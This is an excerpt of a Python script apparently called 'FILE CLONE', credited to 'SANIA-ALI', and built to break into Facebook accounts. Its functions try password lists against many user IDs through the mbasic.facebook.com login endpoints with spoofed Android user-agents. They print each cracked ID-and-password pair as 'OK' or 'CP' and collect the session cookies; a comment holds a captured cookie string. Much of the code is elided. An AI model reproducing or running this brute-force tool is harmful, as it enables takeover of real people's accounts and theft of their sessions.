...
##    ## ##     ## ##   ###  ##  ##     ## 
 ######  ##     ## ##    ## #### ##     ## 
\033[1;92m---------------------------------------------------------
  \033[1;32mAUTHOR    : SANIA-ALI
  \033[1;32mGITHUB    : Unknown
  \033[1;32mFACEBOOK  : SANIA ALI
  \033[1;32mTOOL NAME : FILE CLONE  
  \033[1;32mTOOL TYPE : Personal
  \033[1;32mVERSION   : 1.1
\033[1;92m---------------------------------------------------------
    """  )
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [SANIA]{h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m [\033[1;91mSANIA-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
				...
				#print ()
				print(f'\r\x1b[1;92m [\033[1;92mSANIA-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
...
def rcerek(uid,pwx,tl):
    ...
    # 'cookie': 'datr=_nsVZNzAaBHjY_Ig4mTZpsZ3; sb=_nsVZM4L6j8_Tm-S_1DAg1JQ; dpr=2.4750001430511475; vpd=2066x1081x2.4750001430511475; locale=en_GB; zsh=ASR280q9B2dY2d40qQDG4EPU0dvMkREOJA5l78ev9YHE6uzsHCzoD_DV1-1xauUaeuyFvj7T9ky8KciiGhKvePG6B7WoUG8nfw8th4Y-S0dW64hzI-B-u0zSnQHDBuKPacV_L_TAQ8uiUIujUnAYOEVltWAJ9iYKNi0-q8usOAk-4ZNVP1SZ8GbPIGVEsG1-8AsKOu7UT43vw9VJOZLCmVSUcFIEelGqO8OwPrFdFrvuJ8ADtlGjJz2RZd9MFoDOHUe3s2ygzhjKMXDlmTJFgHJahJqaj6GQtC064sCUe0eUkn5IYInUNE3ZkNWZzA; m_pixel_ratio=2.4750001430511475; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZaUkQ5ZFV4TlJqWGNYMnktbjczMzVIVDZFWmFleHQxQWx3eDU0b2YtZU1YV3NQZVpZVnZ0cEVRd2MxOGhIMnhaVSIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZlpSRDlkVXhOUmpYY1gyeS1uNzMzNUhUNkVaYWV4dDFBbHd4NTRvZi1lTVhXc1BlWllWdnRwRVF3YzE4aEgyeFpVIiwicyI6Im0ifQ%3D%3D; wd=437x835; fr=0wJCE4J82VwQzZUfy.AWXKOIS_HuPddqaudV7ecAqFdDs.BkFXv-.I5.AAA.0.0.BkGS4S.AWVKS2w1ku0',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; Infinix X656 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/345.0.0.8.69',}
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mSANIA-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        ...
        sys.stdout.write('\r%s[SANIA-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
...
def alamin(uid,pwv,tl):
    ...
    try:
        for ps in pwv:
            ...
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 13; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.57 Mobile Safari/537.36',}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
